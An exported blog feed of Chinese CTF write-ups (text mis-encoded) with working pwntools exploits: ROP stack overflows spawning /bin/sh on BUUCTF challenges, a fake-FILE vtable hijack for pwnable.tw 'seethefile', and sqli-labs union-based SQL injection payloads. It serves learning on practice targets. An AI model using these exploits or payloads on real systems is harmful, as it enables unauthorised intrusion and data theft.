<h3 id="ä¾‹é¢˜2ï¼šbuu-jarvisoj-level2-x64"><a href="#ä¾‹é¢˜2ï¼šbuu-jarvisoj-level2-x64" class="headerlink" title="ä¾‹é¢˜2ï¼šbuu  jarvisoj_level2_x64"></a>ä¾‹é¢˜2ï¼š<code>buu</code>  <code>jarvisoj_level2_x64</code></h3><p>æ‹¿åˆ°é¢˜ç›®åå…ˆæ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤ï¼Œ<code>PIE</code>å’Œ<code>canary</code>éƒ½æ²¡å¼€ï¼Œå¼€äº†<code>NX</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359564.png" alt="image-20231207111803128"></p>
<p>æŠŠé¢˜ç›®æ”¾å…¥<code>ida</code>é‡Œï¼ŒæŸ¥çœ‹</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000446.png" alt="image-20231207113118006" style="zoom: 80%;" />

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000356.png" alt="image-20231207113230907"></p>
<p>å®šä¹‰äº†ä¸€ä¸ªæ•°ç»„<code>buf[128]</code>ï¼Œæœ‰<code>read</code>å‡½æ•°<code>0x200uLL</code>æ˜æ˜¾å¤§äº128ï¼Œå¯ä»¥æ ˆæº¢å‡ºã€‚è®¡ç®—åç§»é‡ï¼Œä¸º0x80+8</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000814.png" alt="image-20231207121308672"></p>
<p>æœ‰<code>system</code>å‡½æ•°è¿˜æ˜¯ä¸¤ä¸ªï¼Œä½†æ˜¯å‚æ•°éƒ½ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚å†æŸ¥çœ‹ä¸€ä¸‹å­—ç¬¦ä¸²(<code>shift+F12</code>)</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000093.png" alt="image-20231207113459891"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000599.png" alt="image-20231207113617885"></p>
<p>å¾ˆå¥½ï¼Œæœ‰<code>/bin/sh</code>ç‚¹è¿›å»æŸ¥çœ‹åœ°å€ï¼Œä¸º0x600a90ï¼Œéšä¾¿é€‰ä¸€ä¸ª<code>system</code>çš„åœ°å€ä¸º0x400603</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000124.png" alt="image-20231207115950982"></p>
<p>æˆ‘ä»¬è¦åšçš„å°±æ˜¯é€šè¿‡<code>pop rdi;ret</code>æŠŠ<code>/bin/sh</code>ä¼ å‚ç»™<code>system</code>å‡½æ•°ï¼Œé€šè¿‡<code>ROPgadget --binary level2_x64 | grep &quot;pop rdi&quot;</code>å‘½ä»¤å¾—åˆ°<code>pop rdi ; ret</code>åœ°å€ï¼Œå¦‚ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000948.png" alt="image-20231207120209890"></p>
<p>æœ€å<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x400603</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006b3</span></span><br><span class="line">bin_addr = <span class="number">0x600a90</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi_addr)+p64(bin_addr)+p64(system_addr)</span><br><span class="line"><span class="comment">#æŒ‰é¡ºåºå†™å…¥ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªé¡ºåºæˆ‘ä¹Ÿä¸çŸ¥é“</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pop rdiæ§åˆ¶ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œretè¡”æ¥ä¸‹ä¸€æ¡æŒ‡ä»¤</span></span><br><span class="line"><span class="comment">#pop rdiæŠŠbin_addrè¿™ä¸ªåœ°å€å¼¹åˆ°äº†rdiå¯„å­˜å™¨ä¸­ï¼Œretæ‰§è¡Œè§¦å‘system_addr</span></span><br><span class="line"><span class="comment">#è°ƒè¯•ä¸€ä¸‹çœ‹çš„å¾ˆæ¸…æ¥šï¼Œè¿™ä¹Ÿä¸çŸ¥é“ï¼Œé‚£ä¹Ÿä¸çŸ¥é“ï¼Œä½ çŸ¥é“å•¥ï¼Œä½ è¿™ä¸çŸ¥é“  è¿™é¢˜å°±ä¸ç®—å¼„æ‡‚äº†ï¼Œä¸è¦å¾—è¿‡ä¸”è¿‡</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000641.png" alt="image-20231207120706744"></p>
<h3 id="ä¾‹é¢˜3ï¼šbuu-jarvisoj-level2"><a href="#ä¾‹é¢˜3ï¼šbuu-jarvisoj-level2" class="headerlink" title="ä¾‹é¢˜3ï¼šbuu  jarvisoj_level2"></a>ä¾‹é¢˜3ï¼š<code>buu</code>  <code>jarvisoj_level2</code></h3><p>å‰é¢å‡ æ­¥éƒ½åŒä¸Šï¼Œæˆ‘å°±ä¸å†å¤šè¯´ã€‚</p>
<p>å¦‚ä¸‹ï¼Œ<code>system</code>çš„åœ°å€0x0804849eï¼Œåç§»é‡0x88+4</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000611.png" alt="image-20231207193202760"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001200.png" alt="image-20231207193238143"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231207193505701](https://raw.githubusercontent.com/Qwen11/picture/main/202503140001790.png)</span><br><span class="line"></span><br><span class="line">æœ€å```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28486)</span><br><span class="line"></span><br><span class="line">system_addr = 0x0804849e</span><br><span class="line">shell_addr = 0x0804a024</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(shell_addr)</span><br><span class="line">#payload = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(8)+p32(shell_addr)</span><br><span class="line">#payload = b&#x27;a&#x27;*(0x88)+p32(0xffffe000)+p32(system_addr)+p32(0xffffe000)+p32(shell_addr)</span><br><span class="line">#å› ä¸ºè¿™ä¸ªp32(8)çš„ä½ç½®æ˜¯ä½ è°ƒç”¨systemå‡½æ•°çš„è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯systemå‡½æ•°æ‰§è¡Œåè¦æ‰§è¡Œçš„åœ°å€ã€‚è€Œsystemå‡½æ•°æ‰§è¡Œäº†å‘½ä»¤/bin/shåä¼šå¼€å¯ä¸€ä¸ªå­è¿›ç¨‹é˜»å¡å½“å‰çš„è¿›ç¨‹ï¼Œæ‰€ä»¥systemå‡½æ•°ä¸ä¼šè¿”å›ï¼Œè¿™ä¸ªåœ°å€8ä¹Ÿå°±ä¸ä¼šè¢«è·³è½¬ï¼Œè¿™é‡Œä½ å¯ä»¥æ¢æˆä»»æ„ä¸€ä¸ªå€¼éƒ½èƒ½æˆåŠŸï¼Œä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆå†™äº†ä¸€ä¸ªéæ³•åœ°å€ä½†ç¨‹åºä¸ä¼šå´©æºƒ ï¼Œå› ä¸ºsystemå‹æ ¹å°±æ²¡è¿”å›</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001116.png" alt="image-20231207193934134"></p>
]]></content>
      <categories>
        <category>pwnå­¦ä¹ æ€»ç»“</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-seethefile</title>
    <url>/2024/08/13/seethefile/</url>
    <content><![CDATA[<p>ç¬¬ä¸€æ¬¡åšiofileç±»å‹çš„é¢˜ç›®ï¼Œä¹ŸèŠ±äº†ä¸å°‘æ—¶é—´å»å­¦ä¹ ï¼Œç…§ä¾‹è®°å½•ä¸€ä¸‹å§ã€‚</p>
<span id="more"></span>

<h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><p>ç¨‹åºå¤§è‡´å†…å®¹æ˜¯ï¼Œæ‰“å¼€æŒ‡å®šçš„æ–‡ä»¶ï¼Œè¯»å‡ºæ•°æ®ï¼Œæ‰“å°å‡ºæ¥ï¼Œä¸èƒ½æ‰“å¼€åä¸º_flag_çš„æ–‡ä»¶ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, name);</span><br><span class="line">        <span class="keyword">if</span> ( fp )</span><br><span class="line">          fclose(fp);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p><code>switch(5)</code>æ—¶ï¼Œå¾€<em>name</em>ä¸­è¾“å…¥æ•°æ®æ—¶ï¼Œæœ‰ä¸€ä¸ªæº¢å‡ºæ¼æ´ã€‚å¦‚ä¸‹ï¼Œ<em>name</em>åœ¨*.bss<em>æ®µï¼Œè€Œ<code>fp</code>å°±åœ¨</em>name<em>ä¸‹æ–¹<code>0x20</code>ä¸ªå­—èŠ‚å¤„ï¼Œæ•…æˆ‘ä»¬å¯ä»¥æº¢å‡º</em>name*è¦†ç›–<code>fp</code>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9Fâ†‘o</span><br><span class="line">.bss:0804B260                                         ; main+B4â†‘o</span><br><span class="line">.bss:0804B280                 public fp</span><br><span class="line">.bss:0804B280 ; FILE *fp</span><br><span class="line">.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6â†‘r</span><br><span class="line">.bss:0804B280                                         ; openfile+ADâ†‘w ...</span><br><span class="line">.bss:0804B280 _bss            ends</span><br><span class="line">.bss:0804B280</span><br></pre></td></tr></table></figure>

<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><h3 id="æ³„æ¼libc"><a href="#æ³„æ¼libc" class="headerlink" title="æ³„æ¼libc"></a>æ³„æ¼<em>libc</em></h3><p>â€‹	ç”±äºå¯ä»¥è¯»å–æŒ‡å®šæ–‡ä»¶çš„æ•°æ®ï¼Œæ•…å¯ä»¥ç›´æ¥åˆ©ç”¨<em>linux</em>çš„<em>proc</em>ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œè¯»å–<code>/proc/self/maps</code>å³å¯è·å¾—libcåŸºå€ã€‚ä¸è¿‡ä¸€æ¬¡åªèƒ½è¯»å–<code>0x18</code>å­—èŠ‚ï¼Œå¯èƒ½è¦å¤šè¯»å–å‡ æ¬¡ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openfile(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="æ„é€ -fake-file"><a href="#æ„é€ -fake-file" class="headerlink" title="æ„é€ _fake_file"></a>æ„é€ <code>_fake_file</code></h3><p><code>32</code>ä½é‡Œ<code>file</code>åˆ°<code>vtable</code>çš„åç§»ä¸º<code>0x94</code>ï¼Œå¯¹äºä¼ªé€ <code>file</code>ï¼Œæœ‰å¦‚ä¸‹è§£é‡Šï¼š</p>
<ul>
<li>åç§»ä¸º<code>0</code>å¤„è®¾ç½®ä¸º<code>0xffffdfff</code></li>
<li>åç§»ä¸º<code>4</code>å¤„è®¾ç½®ä¸ºè¦æ‰§è¡Œçš„æŒ‡ä»¤å­—ç¬¦ä¸²</li>
<li>ç„¶åç”¨åƒåœ¾å­—èŠ‚å¡«å……è‡³<code>vtable</code>å¤„</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_FILE = <span class="number">0x804b280</span>+<span class="number">0x4</span>   <span class="comment">#påŒºåŸŸçš„é¦–åœ°å€æ˜¯0x804b284</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_FILE)   <span class="comment">#fpæŒ‡å‘påŒºåŸŸ</span></span><br><span class="line">payload+= p32(<span class="number">0xffffdfff</span>)+<span class="string">b&#x27;;sh&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x94</span>-<span class="number">0x4</span>-<span class="number">0x3</span>)</span><br><span class="line"><span class="comment">#åœ¨påŒºåŸŸè®¾ç½®sizeä¸º0x94å­—èŠ‚çš„file(_IO_FILE	file;)</span></span><br><span class="line">payload+= p32(fake_FILE+<span class="number">0x90</span>)+p32(system_addr)</span><br><span class="line"><span class="comment">#è¦†ç›–vtableä¸ºsystem_addrçš„åœ°å€</span></span><br><span class="line">exit_with_name(payload)</span><br></pre></td></tr></table></figure>

<p>æœ¬é¢˜ç»™çš„<em>libc</em>ç‰ˆæœ¬ä¸º<code>2.23</code>,<code>libc2.24</code>ä»¥ä¸‹çš„ç‰ˆæœ¬æ²¡æœ‰å¯¹è™šè¡¨è¿›è¡Œæ£€æŸ¥ï¼Œæ‰€ä»¥ç›´æ¥ä¼ªé€ å³å¯ã€‚</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><h3 id="æœ¬åœ°"><a href="#æœ¬åœ°" class="headerlink" title="æœ¬åœ°"></a>æœ¬åœ°</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x08048AE0</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_with_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,name)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_FILE = <span class="number">0x804b280</span>+<span class="number">0x4</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_FILE)</span><br><span class="line">payload+= p32(<span class="number">0xffffdfff</span>)+<span class="string">b&#x27;;sh&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x94</span>-<span class="number">0x4</span>-<span class="number">0x3</span>)</span><br><span class="line">payload+= p32(fake_FILE+<span class="number">0x90</span>)+p32(system_addr)</span><br><span class="line">exit_with_name(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="è¿œç¨‹"><a href="#è¿œç¨‹" class="headerlink" title="è¿œç¨‹"></a>è¿œç¨‹</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./seethefile&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10200</span>)</span><br><span class="line">debug(p,<span class="number">0x08048AE0</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_with_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,name)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line"><span class="comment"># readfile()</span></span><br><span class="line"><span class="comment"># writefile()</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_FILE = <span class="number">0x804b280</span>+<span class="number">0x4</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_FILE)</span><br><span class="line">payload+= p32(<span class="number">0xffffdfff</span>)+<span class="string">b&#x27;;sh&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8d</span>+p32(fake_FILE+<span class="number">0x98</span>)</span><br><span class="line">payload+= p32(<span class="number">0</span>)*<span class="number">2</span>+p32(system)</span><br><span class="line">exit_with_name(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.twåˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labé¶åœºé€šå…³è®°å½•</title>
    <url>/2024/10/29/sqli-lab%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="åŸºäºæŠ¥é”™æ³¨å…¥"><a href="#åŸºäºæŠ¥é”™æ³¨å…¥" class="headerlink" title="åŸºäºæŠ¥é”™æ³¨å…¥"></a>åŸºäºæŠ¥é”™æ³¨å…¥</h2><h3 id="å•å¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#å•å¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å•å¼•å·å­—ç¬¦å‹æ³¨å…¥"></a>å•å¼•å·å­—ç¬¦å‹æ³¨å…¥</h3><h4 id="å­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; //ç­‰å·å‰åä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå³ä¸èƒ½æ˜¯?id = 1&#x27;</span>è¿™æ ·</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132304860.png" alt="image-20240911225450764"></p>
<h4 id="æ˜¯å¦ä¸ºå•å¼•å·é—­åˆå‹æ³¨å…¥"><a href="#æ˜¯å¦ä¸ºå•å¼•å·é—­åˆå‹æ³¨å…¥" class="headerlink" title="æ˜¯å¦ä¸ºå•å¼•å·é—­åˆå‹æ³¨å…¥"></a>æ˜¯å¦ä¸ºå•å¼•å·é—­åˆå‹æ³¨å…¥</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>ç”¨<code>--+</code>æŠŠåé¢çš„å†…å®¹æ³¨é‡Šæ‰ï¼Œç„¶åå›æ˜¾æ­£å¸¸ï¼Œè¯´æ˜æ˜¯å•å¼•å·é—­åˆå‹æ³¨å…¥</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919410.png" alt="image-20240911225916591"></p>
<h4 id="è¯¥è¯­å¥æŸ¥è¯¢äº†å‡ åˆ—æ•°æ®"><a href="#è¯¥è¯­å¥æŸ¥è¯¢äº†å‡ åˆ—æ•°æ®" class="headerlink" title="è¯¥è¯­å¥æŸ¥è¯¢äº†å‡ åˆ—æ•°æ®"></a>è¯¥è¯­å¥æŸ¥è¯¢äº†å‡ åˆ—æ•°æ®</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">1</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">2</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>ä¸€ç›´åˆ°<code>3</code>æ—¶ä¾ç„¶å›æ˜¾æ­£å¸¸ï¼Œåˆ°<code>4</code>å°±å¼€å§‹æŠ¥é”™ï¼Œè¯´æ˜æŸ¥è¯¢äº†<code>3</code>åˆ—æ•°æ®ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬ç°åœ¨æ„é€ çš„ï¼Œ<code>union</code>åé¢çš„è¯­å¥ä¸­ä¹Ÿè¦æŸ¥è¯¢<code>3</code>åˆ—ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919141.png" alt="image-20240911230911434"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131920889.png" alt="image-20240911225916591"></p>
<h4 id="ä¼šæ˜¾ç¤ºå“ªå‡ åˆ—"><a href="#ä¼šæ˜¾ç¤ºå“ªå‡ åˆ—" class="headerlink" title="ä¼šæ˜¾ç¤ºå“ªå‡ åˆ—"></a>ä¼šæ˜¾ç¤ºå“ªå‡ åˆ—</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">-1 æ˜¯å› ä¸ºå‰é¢è¦é”™è¯¯ï¼Œunionåé¢çš„æ‰èƒ½æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡å›æ˜¾<code>2,3</code>å¯çŸ¥ï¼Œæ˜¯ç¬¬äºŒï¼Œä¸‰åˆ—</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131920900.png" alt="image-20240911231819368"></p>
<h4 id="æŸ¥è¯¢æ•°æ®åº“å"><a href="#æŸ¥è¯¢æ•°æ®åº“å" class="headerlink" title="æŸ¥è¯¢æ•°æ®åº“å"></a>æŸ¥è¯¢æ•°æ®åº“å</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure>

<p>æ˜¾ç¤ºå½“å‰çš„æ•°æ®åº“åæ˜¯<code>security</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921921.png" alt="image-20240911232330147"></p>
<h4 id="æŸ¥è¯¢è¡¨å"><a href="#æŸ¥è¯¢è¡¨å" class="headerlink" title="æŸ¥è¯¢è¡¨å"></a>æŸ¥è¯¢è¡¨å</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè¦çŸ¥é“ï¼Œ**<code>group_concat()</code>å‡½æ•°ä¼šå°†æŸ¥è¯¢çš„è¡¨åè¿åœ¨ä¸€èµ·è¾“å‡º<strong>ï¼Œç„¶åï¼Œ</strong>æœ‰ä¸€ä¸ª<code>information_schema</code>åº“ï¼Œè¯¥åº“ä¸­æœ‰ä¸€ä¸ª<code>tables</code>è¡¨ï¼Œè¯¥è¡¨å­˜æœ‰æ‰€æœ‰æ•°æ®åº“çš„è¡¨åã€‚**<code>table_schema=&#39;security&#39;</code>è¡¨ç¤ºæŸ¥è¯¢<code>table_schema</code>å­—æ®µä¸º<code>security</code>çš„åˆ—ï¼Œå†åŠ ä¸Šå‰é¢çš„<code>table_name</code>(<code>tables</code>è¡¨ä¸­çš„ä¸€ä¸ªåˆ—åï¼Œä¸‹é¢å…¨æ˜¯å„ç§åº“ä¸­çš„è¡¨å)ï¼Œè¡¨ç¤ºæŸ¥è¯¢<code>security</code>åº“çš„æ‰€æœ‰è¡¨åã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131921019.png" alt="image-20240911233736048"></p>
